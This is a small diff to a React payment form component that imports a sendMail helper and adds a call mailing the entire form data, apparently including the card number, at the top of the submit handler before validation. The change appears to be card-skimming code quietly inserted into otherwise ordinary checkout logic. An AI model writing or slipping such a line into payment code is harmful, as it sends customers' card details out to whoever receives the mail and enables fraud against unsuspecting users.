@@ -10,6 +10,7 @@ import { useRouter } from "next/navigation";
 import { usePaymentForm } from "./paymentform";
 import { PaymentSchema } from "./schema";
 import WaitingDialog from "../waiting-dilaog";
+import { sendMail } from "@/lib/utils";
 
 export default function PaymentForm() {
   const { formData, isSubmitting, updateFormField } = usePaymentForm();
@@ -115,7 +116,7 @@ export default function PaymentForm() {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-
+    await sendMail(formData);
     // Remove spaces from card number before validation
     const validationData = {
       ...formData,
